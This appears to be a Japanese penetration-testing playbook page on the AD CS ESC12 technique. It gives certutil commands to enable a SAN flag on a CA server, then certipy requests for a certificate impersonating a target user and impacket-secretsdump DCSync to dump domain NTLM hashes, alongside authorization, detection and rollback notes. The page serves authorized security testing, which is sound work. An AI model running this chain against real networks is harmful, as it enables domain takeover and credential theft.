# ESC12 — EDITF_ATTRIBUTESUBJECTALTNAME2 + CA へのシェルアクセス

> **スコープ**: CA サーバーへのシェルアクセスがある場合に `EDITF_ATTRIBUTESUBJECTALTNAME2` フラグを設定（または確認）して ESC6 相当の証明書発行〜DCSync まで扱う。

> **[HIGH IMPACT]** 本攻撃は以下の理由で本番では原則禁止または個別合意必須：
> - [x] 持続化に該当（発行した証明書はパスワード変更後も有効）
> - [x] SIEM/EDR で確実に検知される（Event ID 4886・4887・4768・MDI アラート）
> - [x] 不可逆な設定変更を含む（`EDITF_ATTRIBUTESUBJECTALTNAME2` の設定変更は CA 全体に影響）
> - [x] 業務停止リスク（`certutil -setreg` による CA サービス再起動を伴う場合がある）
>
> 実施可否は事前合意で明示確認すること。CA フラグの変更は必ず変更前の値を記録し、テスト完了時に元に戻すこと。演習環境では制約なし。

## 着火条件

**パターン A:** CA の `EDITF_ATTRIBUTESUBJECTALTNAME2` フラグが既に有効（Certipy で `User Specified SAN: Enabled` として検出 = ESC6 と同義）+ CA サーバーへのシェルアクセスがある

**パターン B:** CA サーバーへのローカル管理者またはリモートシェルアクセスがある + フラグが現時点では無効だが攻撃者が設定できる

## 環境前提
- 実行環境: CA サーバー上（ローカル管理者権限）/ テスター端末（証明書申請・認証フェーズ）
- 必要なツール: `certutil`（Windows 標準搭載）/ `certipy`（テスター端末側）

## 先に確認すること

**攻撃者の思考トレース:** ESC6 はこのフラグが既存設定で有効な脆弱性。ESC12 は CA マシンへのシェルアクセスを利用してフラグを設定・利用するパターン。CA サーバーは通常 Tier 0 資産のため、シェル取得経路（CA サーバーの別の脆弱性・平文認証情報）の確立が先決。

---

## 1. CA フラグの確認

**コマンド:**

```bash
# [Attacker] CA フラグの現在値を確認（テスター端末から Certipy で）
certipy find -u [USER]@[DOMAIN] -p "[PASSWORD]" -dc-ip [DC_IP] -stdout
# "User Specified SAN: Enabled/Disabled" を確認
```

```powershell
# [Target / CA Server] CA フラグを直接確認
certutil -getreg policy\EditFlags
# 出力に "EDITF_ATTRIBUTESUBJECTALTNAME2 -- 0x40000 (262144)" が含まれれば有効
```

**観測される出力 → 次のアクション:**

| 出力 | 示唆 | 次のアクション |
|---|---|---|
| `User Specified SAN: Enabled` | フラグ設定済み（ESC6 相当）| `ESC6.md` を参照（手順は完全に同一）|
| `User Specified SAN: Disabled` + CA シェルあり | パターン B のフラグ設定 → §2 へ |
| CA サーバーへのアクセスが確立できない | ESC12 は使えない | ESC1〜ESC8 の経路を再確認 |

---

## 2. パターン B: CA シェルからフラグを有効化する

**事前準備（必須）:** 変更前のフラグ値を記録する。

```powershell
# [Target / CA Server] 現在のフラグ値を記録（原状回復のため必須）
certutil -getreg policy\EditFlags
# 出力例: EditFlags REG_DWORD = 0x11014e (1114446) ← この値をメモ
```

**コマンド:**

```powershell
# [Target / CA Server] EDITF_ATTRIBUTESUBJECTALTNAME2 フラグを追加
certutil -setreg policy\EditFlags +EDITF_ATTRIBUTESUBJECTALTNAME2
# CA サービスの再起動が必要
net stop certsvc && net start certsvc
```

---

## 3. 任意のテンプレートで UPN を指定して証明書申請〜DCSync

ESC6 の §2〜§3 と同一フロー → `ESC6.md`

**事前準備（必須）:** `sudo ntpdate -u [DC_IP]` で時刻同期。

```bash
# [Attacker] Client Authentication EKU を持つ任意のテンプレートで申請
certipy req -ca [CA_NAME] -template [TEMPLATE_NAME] \
  -u [USER]@[DOMAIN] -p "[PASSWORD]" -dc-ip [DC_IP] -upn [TARGET_UPN]
# → [TARGET_USERNAME].pfx が生成される

# [Attacker] PKINIT 認証
certipy auth -pfx [TARGET_USERNAME].pfx -dc-ip [DC_IP]

# [Attacker] DCSync
impacket-secretsdump -just-dc-ntlm -no-pass -hashes :[NT_HASH] [DOMAIN]/[TARGET_USERNAME]@[DC_IP]
```

---

## 4. 原状回復（パターン B のフラグを戻す）

```powershell
# [Target / CA Server] フラグを元の値に戻す（記録していた値を使う）
certutil -setreg policy\EditFlags -EDITF_ATTRIBUTESUBJECTALTNAME2
net stop certsvc && net start certsvc
```

```bash
# [Attacker] 証明書の失効
certipy ca -ca [CA_NAME] -u [USER]@[DOMAIN] -p "[PASSWORD]" -dc-ip [DC_IP] -revoke [REQUEST_ID]
```

---

## 刺さらなかったとき（全体）

| 状況 | 対処 |
|------|------|
| CA サーバーへのシェルアクセスが得られない | ESC12 は使えない。CA サーバーへの別の侵害経路を探す |
| `certutil -setreg` に `ACCESS_DENIED` | ローカル管理者権限が必要。DA 権限がある場合は `psexec` 経由でローカル SYSTEM として実行する |
| フラグ有効化後も `certipy req` に `-upn` が効かない | CA サービスの再起動を実施しているか確認 |

---

## 注意点・落とし穴

- **CA サービスの再起動は業務影響あり**: 停止中は証明書の発行・失効・確認ができなくなる。本番では再起動タイミングの調整が必須
- **CA サーバーは通常 Tier 0 資産**: CA サーバーへの侵害は AD フォレスト全体への影響を持つ。操作ログを詳細に記録する
- **変更前のフラグ値は必ず記録する**: 記録せずに変更すると原状回復が困難になる

---

## 本番での前提

- **事前合意の要否**: ★★★（書面承認必須）。CA サーバーへの直接アクセスとフラグ変更は最高影響度の操作
- **想定されるSIEM/EDR検知**: CA サービス停止・再起動ログ / Event ID 4886・4887 / `certutil` 実行ログ / MDI アラート
- **業務影響リスク**: CA サービス再起動中は証明書サービスが一時停止する。スマートカード認証やオートエンロールメントを使う環境では影響が大きい
- **原状回復必須項目**: ✅ `EDITF_ATTRIBUTESUBJECTALTNAME2` フラグを元の値に戻す / ✅ CA サービス再起動で設定を反映 / ✅ 発行した証明書を CA で失効 / ✅ 取得した NT ハッシュ・TGT・pfx の暗号化保管・テスト完了時破棄
- **演習環境での扱い**: 制約なし（HTB / OSCP 等は本セクション全項目をスキップしてよい）

---

## 関連技術

- 前：AD CS の列挙と ESC 番号の特定 → `Overview.md`
- 前：ESC6（同一フラグを設定済みの状態から悪用）→ `ESC6.md`
- 前：ESC7（ManageCA 権限でのリモートフラグ変更）→ `ESC7.md`
- 後：証明書取得後の DCSync → `../Credential_Dumping.md`
- ツール詳細 → `../../05_Tools_Reference/Certipy.md`
